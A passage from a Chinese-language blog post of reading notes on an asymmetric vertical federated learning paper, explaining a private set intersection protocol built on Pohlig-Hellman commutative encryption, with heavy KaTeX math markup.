style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9382em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9614em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>此外，弱方会知道真实交集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>APSI协议的结果如图3所示：</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220717121516433.png" alt></p><h2 id="A-Pohlig-Hellman-Realization">A Pohlig-Hellman Realization</h2><p>使用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mi>n</mi></msub><mo>=</mo><mo stretchy="false">(</mo><msubsup><mi mathvariant="double-struck">Z</mi><mi>n</mi><mo>∗</mo></msubsup><mo separator="true">,</mo><mo>⋅</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G_n=(\mathbb{Z}_n^*, \cdot)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathbb">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">⋅</span><span class="mclose">)</span></span></span></span>表示一个乘法群，而后 Pohlig-Hellman加密体制可以用以下3个组件进行描述：</p><ol><li><p><strong>(Key generation)</strong> 选择1个素数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 使得每一个明文元素都是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 中的一个元素，并且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>有至少1个大素数因子。然后选择 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>∈</mo><msub><mi>G</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a\in G_{p-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 并计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>∈</mo><msub><mi>G</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a^{-1}\in G_{p-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8532em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>。最后，一方展示 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 作为公共知识，并将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><msup><mi>a</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(a, a^{-1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>作为<em>对称</em>密码体系的密钥。</p></li><li><p><strong>(Encryption)</strong> 加密明文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>∈</mo><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">m\in G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>为：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>E</mi><mi>a</mi></msub><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>m</mi><mi>a</mi></msup></mrow><annotation encoding="application/x-tex">E_a(m)=m^a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7144em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span></span></span></span></span></p></li><li><p><strong>(Decryption)</strong> 解密密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>∈</mo><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">c\in G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>为：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>D</mi><mi>a</mi></msub><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>c</mi><msup><mi>a</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></msup></mrow><annotation encoding="application/x-tex">D_a(c)=c^{a^{-1}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0369em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0369em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p></li></ol><p>Pohlig-Hellman加密体制满足<strong>交换律</strong>，也就是说：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo>∈</mo><msub><mi>G</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>E</mi><mi>a</mi></msub><mo>∘</mo><msub><mi>E</mi><mi>b</mi></msub><mo>=</mo><msub><mi>E</mi><mi>b</mi></msub><mo>∘</mo><msub><mi>E</mi><mi>a</mi></msub></mrow><annotation encoding="application/x-tex">\forall a,b\in G_{p-1},E_{a} \circ E_{b}=E_{b} \circ E_{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">∀</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。（“先用a加密再用b加密“和”先用b加密再用a加密“的密文相同）。基于Pohlig-Hellman加密的APSI协议如算法1所示：</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220717123409736.png" alt></p><p>其中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">I</mi><mi mathvariant="normal">i</mi></msub></mrow><annotation encoding="application/x-tex">\mathrm{I_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathrm">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3175em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathrm mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 表示的是ID的明文，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">U</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\mathrm{U}_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathrm">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 表示的加密1次的密文，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="normal">U</mi><mi>i</mi><mo>†</mo></msubsup></mrow><annotation encoding="application/x-tex">\mathrm{U}_i^\dagger</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2439em;vertical-align:-0.2769em;"></span><span class="mord"><span class="mord mathrm">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.967em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">†</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span></span></span></span></span></span></span></span></span></span> 为加密2次的密文。</p><p>协议思想较为简单，核心在于第7步中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 会随机选择出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="normal">U</mi><mn>1</mn><mo lspace="0em" rspace="0em">†</mo></msubsup><mo>∩</mo><msubsup><mi mathvariant="normal">U</mi><mn>2</mn><mo lspace="0em" rspace="0em">†</mo></msubsup><mo>⊂</mo><msup><mi mathvariant="normal">U</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi><mo>†</mo></mrow></msup><mo>⊂</mo><msubsup><mi mathvariant="normal">U</mi><mn>1</mn><mo>†</mo></msubsup></mrow><annotation encoding="application/x-tex">\mathrm{U}_{1}^{\dagger} \cap \mathrm{U}_{2}^{\dagger} \subset \mathrm{U}^{o b f \dagger} \subset \mathrm{U}_1^\dagger</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2333em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathrm">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.967em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">†</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.2333em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathrm">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.967em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">†</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 